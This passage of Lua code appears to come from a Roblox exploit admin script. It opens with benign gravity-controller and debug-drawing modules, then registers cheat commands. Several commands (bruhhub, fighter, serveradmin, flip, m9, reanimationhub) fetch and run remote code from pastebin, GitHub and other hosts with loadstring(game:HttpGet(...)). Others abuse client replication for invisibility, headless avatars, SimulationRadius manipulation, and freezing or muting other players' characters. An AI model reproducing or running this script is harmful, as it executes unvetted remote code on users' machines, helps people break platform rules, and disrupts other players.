	
	self.JumpCon = RUNSERVICE.RenderStepped:Connect(function(dt) 
		if (self.Controls:IsJumping()) then
			self:OnJumpRequest()
		end
	end)
	
	self.DeathCon = self.Humanoid.Died:Connect(function() self:Destroy() end)
	self.SeatCon = self.Humanoid.Seated:Connect(function(active) if (active) then self:Destroy() end end)
	self.HeartCon = RUNSERVICE.Heartbeat:Connect(function(dt) self:OnHeartbeatStep(dt) end)
	RUNSERVICE:BindToRenderStep("GravityStep", Enum.RenderPriority.Input.Value + 1, function(dt) self:OnGravityStep(dt) end)
	
	
	return self
end

-- Public Methods

function GravityController:Destroy()
	self.JumpCon:Disconnect()
	self.DeathCon:Disconnect()
	self.SeatCon:Disconnect()
	self.HeartCon:Disconnect()
	
	RUNSERVICE:UnbindFromRenderStep("GravityStep")
	
	self.Collider:Destroy()
	self.VForce:Destroy()
	self.Gyro:Destroy()
	self.StateTracker:Destroy()
	
	self.Humanoid.PlatformStand = false
	self.AnimationHandler:EnableDefault(true)
	
	self.GravityUp = UNIT_Y
end

function GravityController:GetGravityUp(oldGravity)
	return oldGravity
end

function GravityController:IsGrounded(isJumpCheck)
	if (not isJumpCheck) then
		local parts = self.Floor:GetTouchingParts()
		for _, part in next, parts do
			if (not part:IsDescendantOf(self.Character)) then
				return true
			end
		end
	else
		if (self.StateTracker.Jumped) then
			return false
		end
	
		-- 1. check we are touching something with the collider
		local valid = {}
		local parts = self.Collider:GetTouchingParts()
		for _, part in next, parts do
			if (not part:IsDescendantOf(self.Character)) then
				table.insert(valid, part)
			end
		end
		
		if (#valid > 0) then
			-- 2. do a decently long downwards raycast
			local max = math.cos(self.Humanoid.MaxSlopeAngle)
			local ray = Ray.new(self.Collider.Position, -10 * self.GravityUp)
			local hit, pos, normal = workspace:FindPartOnRayWithWhitelist(ray, valid, true)
			
			-- 3. use slope to decide on jump
			if (hit and max <= self.GravityUp:Dot(normal)) then
				return true
			end
		end
	end
	return false
end

function GravityController:OnJumpRequest()
	if (not self.StateTracker.Jumped and self:IsGrounded(true)) then
		local hrpVel = self.HRP.Velocity
		self.HRP.Velocity = hrpVel + self.GravityUp*self.Humanoid.JumpPower*JUMPMODIFIER
		self.StateTracker:RequestedJump()
	end
end

function GravityController:GetMoveVector()
	return self.Controls:GetMoveVector()
end

function GravityController:OnHeartbeatStep(dt)
	local ray = Ray.new(self.Collider.Position, -1.1*self.GravityUp)
	local hit, pos, normal = workspace:FindPartOnRayWithIgnoreList(ray, self.Ignores)
	local lastPart = self.LastPart
	
	if (hit and lastPart and lastPart == hit) then
		local offset = self.LastPartCFrame:ToObjectSpace(self.HRP.CFrame)
		self.HRP.CFrame = hit.CFrame:ToWorldSpace(offset)
	end
	
	self.LastPart = hit
	self.LastPartCFrame = hit and hit.CFrame
end

function GravityController:OnGravityStep(dt)
	-- update gravity up vector
	local oldGravity = self.GravityUp
	local newGravity = self:GetGravityUp(oldGravity)
	
	local rotation = getRotationBetween(oldGravity, newGravity, workspace.CurrentCamera.CFrame.RightVector)
	rotation = IDENTITYCF:Lerp(rotation, TRANSITION)
	
	self.GravityUp = rotation * oldGravity
	
	-- get world move vector
	local camCF = workspace.CurrentCamera.CFrame
	local fDot = camCF.LookVector:Dot(newGravity)
	local cForward = math.abs(fDot) > 0.5 and -math.sign(fDot)*camCF.UpVector or camCF.LookVector
	
	local left = cForward:Cross(-newGravity).Unit
	local forward = -left:Cross(newGravity).Unit
	
	local move = self:GetMoveVector()
	local worldMove = forward*move.z - left*move.x
	worldMove = worldMove:Dot(worldMove) > 1 and worldMove.Unit or worldMove
	
	local isInputMoving = worldMove:Dot(worldMove) > 0
	
	-- get the desired character cframe
	local hrpCFLook = self.HRP.CFrame.LookVector
	local charF = hrpCFLook:Dot(forward)*forward + hrpCFLook:Dot(left)*left
	local charR = charF:Cross(newGravity).Unit
	local newCharCF = CFrame.fromMatrix(ZERO, charR, newGravity, -charF)
	
	local newCharRotation = IDENTITYCF
	if (isInputMoving) then
		newCharRotation = IDENTITYCF:Lerp(getRotationBetween(charF, worldMove, newGravity), 0.7)	
	end
	
	-- calculate forces
	local g = workspace.Gravity
	local gForce = g * self.CharacterMass * (UNIT_Y - newGravity)
	
	local cVelocity = self.HRP.Velocity
	local tVelocity = self.Humanoid.WalkSpeed * worldMove
	local gVelocity = cVelocity:Dot(newGravity)*newGravity
	local hVelocity = cVelocity - gVelocity
	
	if (hVelocity:Dot(hVelocity) < 1) then
		hVelocity = ZERO
	end
	
	local dVelocity = tVelocity - hVelocity
	local walkForceM = math.min(10000, WALKF * self.CharacterMass * dVelocity.Magnitude / (dt*60))
	local walkForce = walkForceM > 0 and dVelocity.Unit*walkForceM or ZERO
	
	-- mouse lock
	local charRotation = newCharRotation * newCharCF
	
	if (self.Camera:IsCamRelative()) then
		local lv = workspace.CurrentCamera.CFrame.LookVector
		local hlv = lv - charRotation.UpVector:Dot(lv)*charRotation.UpVector
		charRotation = lookAt(ZERO, hlv, charRotation.UpVector)
	end
	
	-- get state
	self.StateTracker:OnStep(self.GravityUp, self:IsGrounded(), isInputMoving)

	-- update values
	self.VForce.Force = walkForce + gForce
	self.Gyro.CFrame = charRotation
end
return GravityController
end
function _Draw3D()
	local module = {}
	
	-- Style Guide
	
	module.StyleGuide = {
		Point = {
			Thickness = 0.5;
			Color = Color3.new(0, 1, 0);
		},
		
		Line = {
			Thickness = 0.1;
			Color = Color3.new(1, 1, 0);
		},
		
		Ray = {
			Thickness = 0.1;
			Color = Color3.new(1, 0, 1);
		},
		
		Triangle = {
			Thickness = 0.05;
		};
		
		CFrame = {
			Thickness = 0.1;
			RightColor3 = Color3.new(1, 0, 0);
			UpColor3 = Color3.new(0, 1, 0);
			BackColor3 = Color3.new(0, 0, 1);
			PartProperties = {
				Material = Enum.Material.SmoothPlastic;
			};
		}
	}
	
	-- CONSTANTS
	
	local WEDGE = Instance.new("WedgePart")
	WEDGE.Material = Enum.Material.SmoothPlastic
	WEDGE.Anchored = true
	WEDGE.CanCollide = false
	
	local PART = Instance.new("Part")
	PART.Size = Vector3.new(0.1, 0.1, 0.1)
	PART.Anchored = true
	PART.CanCollide = false
	PART.TopSurface = Enum.SurfaceType.Smooth
	PART.BottomSurface = Enum.SurfaceType.Smooth
	PART.Material = Enum.Material.SmoothPlastic
	
	-- Functions
	
	local function draw(properties, style)
		local part = PART:Clone()
		for k, v in next, properties do
			part[k] = v
		end
		if (style) then
			for k, v in next, style do
				if (k ~= "Thickness") then
					part[k] = v
				end
			end
		end
		return part
	end
	
	function module.Draw(parent, properties)
		properties.Parent = parent
		return draw(properties, nil)
	end
	
	function module.Point(parent, cf_v3)
		local thickness = module.StyleGuide.Point.Thickness
		return draw({
			Size = Vector3.new(thickness, thickness, thickness);
			CFrame = (typeof(cf_v3) == "CFrame" and cf_v3 or CFrame.new(cf_v3));
			Parent = parent;
		}, module.StyleGuide.Point)
	end
	
	function module.Line(parent, a, b)
		local thickness = module.StyleGuide.Line.Thickness
		return draw({
			CFrame = CFrame.new((a + b)/2, b);
			Size = Vector3.new(thickness, thickness, (b - a).Magnitude);
			Parent = parent;
		}, module.StyleGuide.Line)
	end
	
	function module.Ray(parent, origin, direction)
		local thickness = module.StyleGuide.Ray.Thickness
		return draw({
			CFrame = CFrame.new(origin + direction/2, origin + direction);
			Size = Vector3.new(thickness, thickness, direction.Magnitude);
			Parent = parent;
		}, module.StyleGuide.Ray)
	end
	
	function module.Triangle(parent, a, b, c)
		local ab, ac, bc = b - a, c - a, c - b
		local abd, acd, bcd = ab:Dot(ab), ac:Dot(ac), bc:Dot(bc)
		
		if (abd > acd and abd > bcd) then
			c, a = a, c
		elseif (acd > bcd and acd > abd) then
			a, b = b, a
		end
		
		ab, ac, bc = b - a, c - a, c - b
		
		local right = ac:Cross(ab).Unit
		local up = bc:Cross(right).Unit
		local back = bc.Unit
		
		local height = math.abs(ab:Dot(up))
		local width1 = math.abs(ab:Dot(back))
		local width2 = math.abs(ac:Dot(back))
		
		local thickness = module.StyleGuide.Triangle.Thickness
		
		local w1 = WEDGE:Clone()
		w1.Size = Vector3.new(thickness, height, width1)
		w1.CFrame = CFrame.fromMatrix((a + b)/2, right, up, back)
		w1.Parent = parent
		
		local w2 = WEDGE:Clone()
		w2.Size = Vector3.new(thickness, height, width2)
		w2.CFrame = CFrame.fromMatrix((a + c)/2, -right, up, -back)
		w2.Parent = parent
		
		for k, v in next, module.StyleGuide.Triangle do
			if (k ~= "Thickness") then
				w1[k] = v
				w2[k] = v
			end
		end
		
		return w1, w2
	end
	
	function module.CFrame(parent, cf)
		local origin = cf.Position
		local r = cf.RightVector
		local u = cf.UpVector
		local b = -cf.LookVector
		
		local thickness = module.StyleGuide.CFrame.Thickness
		
		local right = draw({
			CFrame = CFrame.new(origin + r/2, origin + r);
			Size = Vector3.new(thickness, thickness, r.Magnitude);
			Color = module.StyleGuide.CFrame.RightColor3;
			Parent = parent;
		}, module.StyleGuide.CFrame.PartProperties)
		
		local up = draw({
			CFrame = CFrame.new(origin + u/2, origin + u);
			Size = Vector3.new(thickness, thickness, r.Magnitude);
			Color = module.StyleGuide.CFrame.UpColor3;
			Parent = parent;
		}, module.StyleGuide.CFrame.PartProperties)
		
		local back = draw({
			CFrame = CFrame.new(origin + b/2, origin + b);
			Size = Vector3.new(thickness, thickness, u.Magnitude);
			Color = module.StyleGuide.CFrame.BackColor3;
			Parent = parent;
		}, module.StyleGuide.CFrame.PartProperties)
		
		return right, up, back
	end
	
	-- Return
	
	return module
end
function _Draw2D()
	local module = {}
	
	-- Style Guide
	
	module.StyleGuide = {
		Point = {
			BorderSizePixel = 0;
			Size = UDim2.new(0, 4, 0, 4);
			BorderColor3 = Color3.new(0, 0, 0);
			BackgroundColor3 = Color3.new(0, 1, 0);
		},
		
		Line = {
			Thickness = 1;
			BorderSizePixel = 0;
			BorderColor3 = Color3.new(0, 0, 0);
			BackgroundColor3 = Color3.new(0, 1, 0);
		},
		
		Ray = {
			Thickness = 1;
			BorderSizePixel = 0;
			BorderColor3 = Color3.new(0, 0, 0);
			BackgroundColor3 = Color3.new(0, 1, 0);
		},
		
		Triangle = {
			ImageTransparency = 0;
			ImageColor3 = Color3.new(0, 1, 0);
		}
	}
	
	-- CONSTANTS
	
	local HALF = Vector2.new(0.5, 0.5)
	
	local RIGHT = "rbxassetid://2798177521"
	local LEFT = "rbxassetid://2798177955"
	
	local IMG = Instance.new("ImageLabel")
	IMG.BackgroundTransparency = 1
	IMG.AnchorPoint = HALF
	IMG.BorderSizePixel = 0
	
	local FRAME = Instance.new("Frame")
	FRAME.BorderSizePixel = 0
	FRAME.Size = UDim2.new(0, 0, 0, 0)
	FRAME.BackgroundColor3 = Color3.new(1, 1, 1)
	
	-- Functions
	
	function draw(properties, style)
		local frame = FRAME:Clone()
		for k, v in next, properties do
			frame[k] = v
		end
		if (style) then
			for k, v in next, style do
				if (k ~= "Thickness") then
					frame[k] = v
				end
			end
		end
		return frame
	end
	
	function module.Draw(parent, properties)
		properties.Parent = parent
		return draw(properties, nil)
	end
	
	function module.Point(parent, v2)
		return draw({
			AnchorPoint = HALF;
			Position = UDim2.new(0, v2.x, 0, v2.y);
			Parent = parent;
		}, module.StyleGuide.Point)
	end
	
	function module.Line(parent, a, b)
		local v = (b - a)
		local m = (a + b)/2
		
		return draw({
			AnchorPoint = HALF;
			Position = UDim2.new(0, m.x, 0, m.y);
			Size = UDim2.new(0, module.StyleGuide.Line.Thickness, 0, v.magnitude);
			Rotation = math.deg(math.atan2(v.y, v.x)) - 90;
			BackgroundColor3 = Color3.new(1, 1, 0);
			Parent = parent;
		}, module.StyleGuide.Line)
	end
	
	function module.Ray(parent, origin, direction)
		local a, b = origin, origin + direction
		local v = (b - a)
		local m = (a + b)/2
		
		return draw({
			AnchorPoint = HALF;
			Position = UDim2.new(0, m.x, 0, m.y);
			Size = UDim2.new(0, module.StyleGuide.Ray.Thickness, 0, v.magnitude);
			Rotation = math.deg(math.atan2(v.y, v.x)) - 90;
			Parent = parent;
		}, module.StyleGuide.Ray)
	end
	
	function module.Triangle(parent, a, b, c)
		local ab, ac, bc = b - a, c - a, c - b
		local abd, acd, bcd = ab:Dot(ab), ac:Dot(ac), bc:Dot(bc)
		
		if (abd > acd and abd > bcd) then
			c, a = a, c
		elseif (acd > bcd and acd > abd) then
			a, b = b, a
		end
		
		ab, ac, bc = b - a, c - a, c - b
		
		local unit = bc.unit
		local height = unit:Cross(ab)
		local flip = (height >= 0)
		local theta = math.deg(math.atan2(unit.y, unit.x)) + (flip and 0 or 180)
		
		local m1 = (a + b)/2
		local m2 = (a + c)/2
		
		local w1 = IMG:Clone()
		w1.Image = flip and RIGHT or LEFT
		w1.AnchorPoint = HALF
		w1.Size = UDim2.new(0, math.abs(unit:Dot(ab)), 0, height)
		w1.Position = UDim2.new(0, m1.x, 0, m1.y)
		w1.Rotation = theta
		w1.Parent = parent
		
		local w2 = IMG:Clone()
		w2.Image = flip and LEFT or RIGHT
		w2.AnchorPoint = HALF
		w2.Size = UDim2.new(0, math.abs(unit:Dot(ac)), 0, height)
		w2.Position = UDim2.new(0, m2.x, 0, m2.y)
		w2.Rotation = theta
		w2.Parent = parent
		
		for k, v in next, module.StyleGuide.Triangle do
			w1[k] = v
			w2[k] = v
		end
		
		return w1, w2
	end
	
	-- Return
	
	return module
end
function _DrawClass()
	local Draw2DModule = _Draw2D()
	local Draw3DModule = _Draw3D()
	
	--
	
	local DrawClass = {}
	local DrawClassStorage = setmetatable({}, {__mode = "k"})
	DrawClass.__index = DrawClass
	
	function DrawClass.new(parent)
		local self = setmetatable({}, DrawClass)
		
		self.Parent = parent
		DrawClassStorage[self] = {}
		
		self.Draw3D = {}
		for key, func in next, Draw3DModule do
			self.Draw3D[key] = function(...)
				local returns = {func(self.Parent, ...)}
				for i = 1, #returns do
					table.insert(DrawClassStorage[self], returns[i])
				end
				return unpack(returns)
			end
		end
		
		self.Draw2D = {}
		for key, func in next, Draw2DModule do
			self.Draw2D[key] = function(...)
				local returns = {func(self.Parent, ...)}
				for i = 1, #returns do
					table.insert(DrawClassStorage[self], returns[i])
				end
				return unpack(returns)
			end
		end
		
		return self
	end
	
	--
	
	function DrawClass:Clear()
		local t = DrawClassStorage[self]
		while (#t > 0) do
			local part = table.remove(t)
			if (part) then
				part:Destroy()
			end
		end
		DrawClassStorage[self] = {}
	end
	
	--
	
	return DrawClass
end


--END TEST

local PLAYERS = game:GetService("Players")

local GravityController = _GravityController()
local Controller = GravityController.new(PLAYERS.LocalPlayer)

local DrawClass = _DrawClass()

local PI2 = math.pi*2
local ZERO = Vector3.new(0, 0, 0)

local LOWER_RADIUS_OFFSET = 3 
local NUM_DOWN_RAYS = 24
local ODD_DOWN_RAY_START_RADIUS = 3	
local EVEN_DOWN_RAY_START_RADIUS = 2
local ODD_DOWN_RAY_END_RADIUS = 1.66666
local EVEN_DOWN_RAY_END_RADIUS = 1

local NUM_FEELER_RAYS = 9
local FEELER_LENGTH = 2
local FEELER_START_OFFSET = 2
local FEELER_RADIUS = 3.5
local FEELER_APEX_OFFSET = 1
local FEELER_WEIGHTING = 8

function GetGravityUp(self, oldGravityUp)
	local ignoreList = {}
	for i, player in next, PLAYERS:GetPlayers() do
		ignoreList[i] = player.Character
	end
	
	-- get the normal
	
	local hrpCF = self.HRP.CFrame
	local isR15 = (self.Humanoid.RigType == Enum.HumanoidRigType.R15)
	
	local origin = isR15 and hrpCF.p or hrpCF.p + 0.35*oldGravityUp
	local radialVector = math.abs(hrpCF.LookVector:Dot(oldGravityUp)) < 0.999 and hrpCF.LookVector:Cross(oldGravityUp) or hrpCF.RightVector:Cross(oldGravityUp)
	
	local centerRayLength = 25
	local centerRay = Ray.new(origin, -centerRayLength * oldGravityUp)
	local centerHit, centerHitPoint, centerHitNormal = workspace:FindPartOnRayWithIgnoreList(centerRay, ignoreList)
	
	--[[disable
	DrawClass:Clear()
	DrawClass.Draw3D.Ray(centerRay.Origin, centerRay.Direction)
	]]
	local downHitCount = 0
	local totalHitCount = 0
	local centerRayHitCount = 0
	local evenRayHitCount = 0
	local oddRayHitCount = 0
	
	local mainDownNormal = ZERO
	if (centerHit) then
		mainDownNormal = centerHitNormal
		centerRayHitCount = 0
	end
	
	local downRaySum = ZERO
	for i = 1, NUM_DOWN_RAYS do
		local dtheta = PI2 * ((i-1)/NUM_DOWN_RAYS)
		
		local angleWeight = 0.25 + 0.75 * math.abs(math.cos(dtheta))
		local isEvenRay = (i%2 == 0)
		local startRadius = isEvenRay and EVEN_DOWN_RAY_START_RADIUS or ODD_DOWN_RAY_START_RADIUS	
		local endRadius = isEvenRay and EVEN_DOWN_RAY_END_RADIUS or ODD_DOWN_RAY_END_RADIUS
		local downRayLength = centerRayLength
		
		local offset = CFrame.fromAxisAngle(oldGravityUp, dtheta) * radialVector
		local dir = (LOWER_RADIUS_OFFSET * -oldGravityUp + (endRadius - startRadius) * offset)
		local ray = Ray.new(origin + startRadius * offset, downRayLength * dir.unit)
		local hit, hitPoint, hitNormal = workspace:FindPartOnRayWithIgnoreList(ray, ignoreList)
		--[[disable
		DrawClass.Draw3D.Ray(ray.Origin, ray.Direction)
		]]
		if (hit) then
			downRaySum = downRaySum + angleWeight * hitNormal
			downHitCount = downHitCount + 1
			if isEvenRay then
				evenRayHitCount = evenRayHitCount + 1					
			else
				oddRayHitCount = oddRayHitCount + 1
			end
		end
	end
	
	local feelerHitCount = 0	
	local feelerNormalSum = ZERO
	
	for i = 1, NUM_FEELER_RAYS do
		local dtheta = 2 * math.pi * ((i-1)/NUM_FEELER_RAYS)
		local angleWeight =  0.25 + 0.75 * math.abs(math.cos(dtheta))	
		local offset = CFrame.fromAxisAngle(oldGravityUp, dtheta) * radialVector
		local dir = (FEELER_RADIUS * offset + LOWER_RADIUS_OFFSET * -oldGravityUp).unit
		local feelerOrigin = origin - FEELER_APEX_OFFSET * -oldGravityUp + FEELER_START_OFFSET * dir
		local ray = Ray.new(feelerOrigin, FEELER_LENGTH * dir)
		local hit, hitPoint, hitNormal = workspace:FindPartOnRayWithIgnoreList(ray, ignoreList)
		--[[disable
		DrawClass.Draw3D.Ray(ray.Origin, ray.Direction)
		]]
		if (hit) then
			feelerNormalSum = feelerNormalSum + FEELER_WEIGHTING * angleWeight * hitNormal --* hitDistSqInv
			feelerHitCount = feelerHitCount + 1
		end
	end
	
	if (centerRayHitCount + downHitCount + feelerHitCount > 0) then
		local normalSum = mainDownNormal + downRaySum + feelerNormalSum
		if (normalSum ~= ZERO) then
			return normalSum.unit
		end
	end
	
	return oldGravityUp
end

Controller.GetGravityUp = GetGravityUp

-- E is toggle
game:GetService("ContextActionService"):BindAction("Toggle", function(action, state, input)
	if not (state == Enum.UserInputState.Begin) then
		return
	end
	
	if (Controller) then
		Controller:Destroy()
		Controller = nil
	else
		Controller = GravityController.new(PLAYERS.LocalPlayer)
		Controller.GetGravityUp = GetGravityUp
	end
end, false, Enum.KeyCode.Z)
print("end")
end)

addcmd('bruhhub',{'bh'},function(args, speaker)
	loadstring(game:HttpGet("https://bruh.keshsenpai.com/.lua"))()
end)

addcmd('unwalkto',{'nowalkto','unfollow','nofollow'},function(args, speaker)
	walkto = false
end)

addcmd('freeze',{'fr'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i,v in pairs(players) do
			spawn(function()
				for i, x in next, Players[v].Character:GetDescendants() do
					if x:IsA("BasePart") and not x.Anchored then
						x.Anchored = true
					end
				end
			end)
		end
	end
end)

addcmd('thaw',{'unfreeze','unfr'},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i,v in pairs(players) do
			spawn(function()
				for i, x in next, Players[v].Character:GetDescendants() do
					if x:IsA("BasePart") and x.Anchored then
						x.Anchored = false
					end
				end
			end)
		end
	end
end)

addcmd('fighter',{'boxer'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/6ru45iG4"))()
end)

addcmd('serveradmin',{'sa'},function(args, speaker)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ONEReverseCard/My-Scripts/main/Netless%20Server%20Admin.md"))()
end)

local notifiedRespectFiltering = false
addcmd('muteboombox',{},function(args, speaker)
	if not notifiedRespectFiltering and game:GetService("SoundService").RespectFilteringEnabled then notifiedRespectFiltering = true notify('RespectFilteringEnabled','RespectFilteringEnabled is set to true (the command will still work but may only be clientsided)') end
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i,v in pairs(players) do
			spawn(function()
				for i, x in next, Players[v].Character:GetDescendants() do
					if x:IsA("Sound") and x.Playing == true then
						x.Playing = false
					end
				end
				for i, x in next, Players[v]:FindFirstChildOfClass("Backpack"):GetDescendants() do
					if x:IsA("Sound") and x.Playing == true then
						x.Playing = false
					end
				end
			end)
		end
	end
end)

addcmd('unmuteboombox',{},function(args, speaker)
	if not notifiedRespectFiltering and game:GetService("SoundService").RespectFilteringEnabled then notifiedRespectFiltering = true notify('RespectFilteringEnabled','RespectFilteringEnabled is set to true (the command will still work but may only be clientsided)') end
	local players = getPlayer(args[1], speaker)
	if players ~= nil then
		for i,v in pairs(players) do
			spawn(function()
				for i, x in next, Players[v].Character:GetDescendants() do
					if x:IsA("Sound") and x.Playing == false then
						x.Playing = true
					end
				end
			end)
		end
	end
end)

addcmd('reset',{},function(args, speaker)
	speaker.Character:BreakJoints()
end)

addcmd('respawn',{},function(args, speaker)
	respawn(speaker)
end)

addcmd('refresh',{'r'},function(args, speaker)
	refresh(speaker)
end)

addcmd('flip',{},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/SNUKFAeK"))()
end)

invisRunning = false
addcmd('invisible',{'invis'},function(args, speaker)
	if invisRunning then return end
	invisRunning = true
	-- Full credit to AmokahFox @V3rmillion
	local Player = speaker
	repeat wait(.1) until Player.Character
	local Character = Player.Character
	Character.Archivable = true
	local IsInvis = false
	local IsRunning = true
	local InvisibleCharacter = Character:Clone()
	InvisibleCharacter.Parent = game:GetService'Lighting'
	local Void = workspace.FallenPartsDestroyHeight
	InvisibleCharacter.Name = ""
	local CF

	local invisFix = game:GetService("RunService").Stepped:Connect(function()
		pcall(function()
			local IsInteger
			if tostring(Void):find'-' then
				IsInteger = true
			else
				IsInteger = false
			end
			local Pos = Player.Character.HumanoidRootPart.Position
			local Pos_String = tostring(Pos)
			local Pos_Seperate = Pos_String:split(', ')
			local X = tonumber(Pos_Seperate[1])
			local Y = tonumber(Pos_Seperate[2])
			local Z = tonumber(Pos_Seperate[3])
			if IsInteger == true then
				if Y <= Void then
					Respawn()
				end
			elseif IsInteger == false then
				if Y >= Void then
					Respawn()
				end
			end
		end)
	end)

	for i,v in pairs(InvisibleCharacter:GetDescendants())do
		if v:IsA("BasePart") then
			if v.Name == "HumanoidRootPart" then
				v.Transparency = 1
			else
				v.Transparency = .5
			end
		end
	end

	function Respawn()
		IsRunning = false
		if IsInvis == true then
			pcall(function()
				Player.Character = Character
				wait()
				Character.Parent = workspace
				Character:FindFirstChildWhichIsA'Humanoid':Destroy()
				IsInvis = false
				InvisibleCharacter.Parent = nil
				invisRunning = false
			end)
		elseif IsInvis == false then
			pcall(function()
				Player.Character = Character
				wait()
				Character.Parent = workspace
				Character:FindFirstChildWhichIsA'Humanoid':Destroy()
				TurnVisible()
			end)
		end
	end

	local invisDied
	invisDied = InvisibleCharacter:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
		Respawn()
		invisDied:Disconnect()
	end)

	if IsInvis == true then return end
	IsInvis = true
	CF = workspace.CurrentCamera.CFrame
	local CF_1 = Player.Character.HumanoidRootPart.CFrame
	Character:MoveTo(Vector3.new(0,math.pi*1000000,0))
	workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
	wait(.2)
	workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
	InvisibleCharacter = InvisibleCharacter
	Character.Parent = game:GetService'Lighting'
	InvisibleCharacter.Parent = workspace
	InvisibleCharacter.HumanoidRootPart.CFrame = CF_1
	Player.Character = InvisibleCharacter
	execCmd('fixcam')
	Player.Character.Animate.Disabled = true
	Player.Character.Animate.Disabled = false

	function TurnVisible()
		if IsInvis == false then return end
		invisFix:Disconnect()
		invisDied:Disconnect()
		CF = workspace.CurrentCamera.CFrame
		Character = Character
		local CF_1 = Player.Character.HumanoidRootPart.CFrame
		Character.HumanoidRootPart.CFrame = CF_1
		InvisibleCharacter:Destroy()
		Player.Character = Character
		Character.Parent = workspace
		IsInvis = false
		Player.Character.Animate.Disabled = true
		Player.Character.Animate.Disabled = false
		invisDied = Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
			Respawn()
			invisDied:Disconnect()
		end)
		invisRunning = false
	end
	notify('Invisible','You now appear invisible to other players')
end)

addcmd('visible',{'vis'},function(args, speaker)
	TurnVisible()
end)

addcmd('toggleinvis',{},function(args, speaker)
	if invisRunning then
		execCmd('visible')
	else
		execCmd('invisible')
	end
end)

addcmd('toolinvisible',{'toolinvis','tinvis'},function(args, speaker)
	local Char  = Players.LocalPlayer.Character
	local touched = false
	local tpdback = false
	local box = Instance.new('Part')
	box.Anchored = true
	box.CanCollide = true
	box.Size = Vector3.new(10,1,10)
	box.Position = Vector3.new(0,10000,0)
	box.Parent = workspace
	local boxTouched = box.Touched:connect(function(part)
		if (part.Parent.Name == Players.LocalPlayer.Name) then
			if touched == false then
				touched = true
				local function apply()
					local no = Char.HumanoidRootPart:Clone()
					wait(.25)
					Char.HumanoidRootPart:Destroy()
					no.Parent = Char
					Char:MoveTo(loc)
					touched = false
				end
				if Char then
					apply()
				end
			end
		end
	end)
	repeat wait() until Char
	local cleanUp
	cleanUp = Players.LocalPlayer.CharacterAdded:connect(function(char)
		boxTouched:Disconnect()
		box:Destroy()
		cleanUp:Disconnect()
	end)
	loc = Char.HumanoidRootPart.Position
	Char:MoveTo(box.Position + Vector3.new(0,.5,0))
end)

addcmd('strengthen',{},function(args, speaker)
	for _, child in pairs(speaker.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			if args[1] then
				child.CustomPhysicalProperties = PhysicalProperties.new(args[1], 0.3, 0.5)
			else
				child.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
			end
		end
	end
end)

addcmd('m9',{'psitol'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/sEAayemX"))()
end)

addcmd('unweaken',{'unstrengthen'},function(args, speaker)
	for _, child in pairs(speaker.Character:GetDescendants()) do
		if child.ClassName == "Part" then
			child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
		end
	end
end)

addcmd('breakvelocity',{},function(args, speaker)
	local BeenASecond = false
	spawn(function()
		repeat wait()
			for i,v in pairs(speaker:GetDescendants()) do
				if v:IsA("BasePart") then
					v.Velocity = Vector3.new(0, 0, 0)
				end
			end
		until BeenASecond
	end)
	spawn(function()
		wait(1)
		BeenASecond = true
	end)
end)

addcmd('jpower',{'jumppower','jp'},function(args, speaker)
	local jpower = args[1] or 50
	if isNumber(jpower) then
		speaker.Character:FindFirstChildOfClass('Humanoid').JumpPower = jpower
	end
end)

addcmd('maxslopeangle',{'msa'},function(args, speaker)
	local sangle = args[1] or 89
	if isNumber(sangle) then
		speaker.Character:FindFirstChildOfClass('Humanoid').MaxSlopeAngle = sangle
	end
end)

addcmd('gravity',{'grav'},function(args, speaker)
	local grav = args[1] or 196.2
	if isNumber(grav) then
		workspace.Gravity = grav
	end
end)

addcmd('Bizzare',{'ba'},function(args, speaker)
	loadstring(game:HttpGet("https://pastebin.com/raw/n6xbTHi2"))()
end)

addcmd('dance', {}, function(args, speaker)
	if not r15(speaker) then
		local dances = {"27789359", "30196114", "248263260", "45834924", "33796059", "28488254", "52155728"}
		local animation = Instance.new("Animation")
		animation.AnimationId = "rbxassetid://" .. dances[math.random(1, #dances)]
		animTrack = speaker.Character.Humanoid:LoadAnimation(animation)
		animTrack:Play()
	else
		notify('R6 Required', 'This command requires the r6 rig type')
	end
end)

addcmd('reanimationhub',{'rh'},function(args, speaker)
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/o5u3/Selexity/main/Main'),true))()
end)

addcmd('nolimbs',{'rlimbs'},function(args, speaker)
	if r15(speaker) then
		for i,v in pairs(speaker.Character:GetChildren()) do
			if v:IsA("BasePart") and
				v.Name == "RightUpperLeg" or
				v.Name == "LeftUpperLeg" or
				v.Name == "RightUpperArm" or
				v.Name == "LeftUpperArm" then
				v:Destroy()
			end
		end
	else
		for i,v in pairs(speaker.Character:GetChildren()) do
			if v:IsA("BasePart") and
				v.Name == "Right Leg" or
				v.Name == "Left Leg" or
				v.Name == "Right Arm" or
				v.Name == "Left Arm" then
				v:Destroy()
			end
		end
	end
end)

addcmd('nohead',{'rhead','headless'},function(args, speaker)
	if sethidden then
		-- Full credit to Thomas_Cornez#0272 @Discord
		local lplr = Players.LocalPlayer
		local char = lplr.Character
		local rig = tostring(char.Humanoid.RigType) == "Enum.HumanoidRigType.R6" and 1 or tostring(char.Humanoid.RigType) == "Enum.HumanoidRigType.R15" and 2

		local speaker = Players.LocalPlayer

		sethidden(speaker, "SimulationRadius", math.huge)

		local test = Instance.new("Model")
		local hum  = Instance.new("Humanoid")
		local animation = Instance.new("Model")
		local humanoidanimation = Instance.new("Humanoid")
		test.Parent = workspace
		hum.Parent = test
		animation.Parent = workspace
		humanoidanimation.Parent = animation

		lplr.Character = test
		wait(2)
		char.Humanoid.Animator.Parent = humanoidanimation
		char.Humanoid:Destroy()

		char.Head:Destroy()
		wait(5)
		game.Players.LocalPlayer.Character = char

		local hum2 = Instance.new("Humanoid")
		hum2.Parent = char
		char:FindFirstChildOfClass("Humanoid").Jump = true

		humanoidanimation.Animator.Parent = hum2
